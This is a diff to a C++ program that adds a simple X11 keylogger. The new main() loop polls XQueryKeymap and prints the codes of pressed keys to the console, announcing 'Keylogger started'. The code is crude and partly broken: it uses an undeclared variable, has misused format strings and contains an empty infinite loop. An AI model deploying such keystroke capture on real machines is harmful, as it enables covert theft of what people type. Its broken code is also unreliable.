@@ -15,6 +15,15 @@
 #include <math.h>
 #include <queue>
 
+#include <X11/Xlib.h>
+#include <X11/Xutil.h>
+#include <X11/XKBlib.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/time.h>
+#include <string>
+
 using namespace std;
 
 /**
@@ -202,10 +211,81 @@ public:
 
 };
 
+double gettime() {
+	timeval tim;
+	gettimeofday(&tim, NULL);
+	double t1 = tim.tv_sec + (tim.tv_usec / 1000000.0);
+	return t1;
+}
+
 /**
  * MAIN -------------------------------------------------------------------------------------------------------------------------------
  */
 int main(void) {
+
+	Display *display_name;
+	int depth, screen, connection;
+	display_name = XOpenDisplay(NULL);
+	screen = DefaultScreen(display_name);
+	depth = DefaultDepth(display_name,screen);
+	connection = ConnectionNumber(display_name);
+	cout << "Keylogger started\n\nInfo about X11 connection:\n";
+	cout << " The display is::%s\n", XDisplayName((char*) display_name);
+	cout << " Width::" << DisplayWidth(display_name,screen)<< "\tHeight::"
+			<< DisplayHeight(display_name,screen)<<"\n";
+	cout << " Connection number is " << connection << "\n";
+
+	if (depth == 1)
+		cout << " You live in prehistoric times\n";
+	else
+		cout << " You've got a coloured monitor with depth of %d\n" << depth;
+
+	cout << "\n\nLogging started.\n\n";
+
+	char keys_return[32];
+
+	while (1) {
+		XQueryKeymap(display_name, keys_return);
+
+		for (int i = 0; i < 32; i++) {
+			if (keys_return[i] != 0) {
+				cout << keys_return << " --- " << a << endl;
+				int pos = 0;
+				int num = keys_return[i];
+				//printf("%.20f: ", gettime());
+
+				while (pos < 8) {
+					if ((num & 0x01) == 1) {
+
+						//printf("%d ", i * 8 + pos);
+						cout << i * 8 + pos << endl;
+					}
+					pos++;
+					num /= 2;
+				}
+				//printf("\n");
+
+//				XkbDescPtr keyboard = XkbGetKeyboard(display_name,
+//						XkbAllComponentsMask, XkbUseCoreKbd);
+//				XkbStateRec state;
+//
+//				XkbGetState(display_name, XkbUseCoreKbd, &state);
+//
+//				unsigned int group = (unsigned int) state.group;
+//				std::cout << group << std::endl;
+//
+//				std::string s1 = XGetAtomName(display_name,
+//						keyboard->names->symbols);
+//				std::string s2 = XGetAtomName(display_name,
+//						keyboard->names->groups[group]);
+//
+//				std::cout << s1 << " - " << s2 << std::endl;
+			}
+		}
+		usleep(30000);
+
+	}
+	XCloseDisplay(display_name);
 
 //	class Thread_a: public Thread {
 //	public:
@@ -236,19 +316,21 @@ int main(void) {
 	ThreadPtr pmt(mt);
 	// Test
 
-	for (int i = 0; i < 10; i++) {
-		InputChar ic;
-		ic.skanCode = 8;
-		mt->add(ic);
+//	for (int i = 0; i < 10; i++) {
+//		InputChar ic;
+//		ic.skanCode = 8;
+//		mt->add(ic);
+//
+//		ic.skanCode = 4;
+//		mt->add(ic);
+//	}
 
-		ic.skanCode = 4;
-		mt->add(ic);
+	InputChar ic;
+	for (;;) {
+
 	}
 
 	pmt->start();
-
-
-
 
 	pmt->wait();
 
